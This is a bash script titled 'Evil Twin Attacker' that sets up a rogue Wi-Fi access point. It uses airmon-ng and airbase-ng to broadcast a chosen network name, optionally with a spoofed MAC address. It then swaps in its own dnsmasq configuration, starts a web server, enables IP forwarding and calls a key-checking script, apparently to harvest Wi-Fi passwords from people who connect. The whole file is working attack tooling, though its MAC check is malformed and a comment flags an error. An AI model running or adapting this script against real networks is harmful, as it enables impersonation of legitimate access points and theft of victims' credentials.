#!/bin/bash

clear
#### Banner
printf "\n\n\n		Evil Twin Attacker		"
sleep 3
clear
####




#### Setting up Dnsmasq config
cp /etc/dnsmasq.conf tmp/dnsmasq/conf_backup
cp core/dnsmasq.conf_default /etc/dnsmasq.conf
sleep 2


#### Apache web server
./webserver.sh
####

file="core/dnsmasq.conf_default"
line=$(sed '2q;d' $file)
temp=$(echo "${line:11:9}")
tap="$temp.1/24"
####

#### Wireless card in Monitor mode
printf "Wireless card name?\n\n"
read -e wcard
airmon-ng check kill
airmon-ng start $wcard
####

#### Airbase
clear
printf "Enter the ESSID\n"
read essid
echo "MAC address ?"
read mac
if ["$mac" == ""];

######################################### get wlan0mon by variables ####################### AN ERROR COMES HERE
then
	echo "No MAC provided... Using system defaults"
	airbase-ng --essid $essid wlan0mon &
else
	echo "Using the MAC address $mac "
	airbase-ng --essid $essid -a $mac wlan0mon &
fi


####

#### Ifconfig
sleep 2
ifconfig at0 $tap
####

#### IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
####

#### Dnsmasq
dnsmasq &
####

#### key checker
./keycheck.sh
####










